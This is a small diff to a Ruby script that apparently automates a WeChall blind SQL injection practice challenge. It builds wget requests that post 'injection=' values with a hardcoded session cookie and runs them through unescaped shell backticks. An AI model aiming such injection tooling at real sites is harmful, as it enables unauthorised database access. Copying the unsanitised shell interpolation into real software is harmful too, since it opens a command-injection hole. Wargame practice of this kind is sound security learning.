@@ -1,7 +1,7 @@
 require 'open-uri'
 
 #CHANGE this based on your cookie
-cookie = "WC=9353216-25483-QDxrXt5Y57wyB6ld"
+$cookie = "WC=9353216-25483-QDxrXt5Y57wyB6ld"
 
 
 #Some general variables
@@ -15,7 +15,7 @@ $hash = ""
 def wget(url, post_data)
 	wget = "wget -O - -q #{url} " \
 	"--header=\"Referer: http://www.wechall.net/challenge/blind_lighter/index.php\" " \
-	"--header=\"Cookie: #{cookie}\" " \
+	"--header=\"Cookie: #{$cookie}\" " \
 	"--post-data \"injection=#{post_data}&inject=Inject\""
 	$how_many_total += 1
 	return `#{wget}`
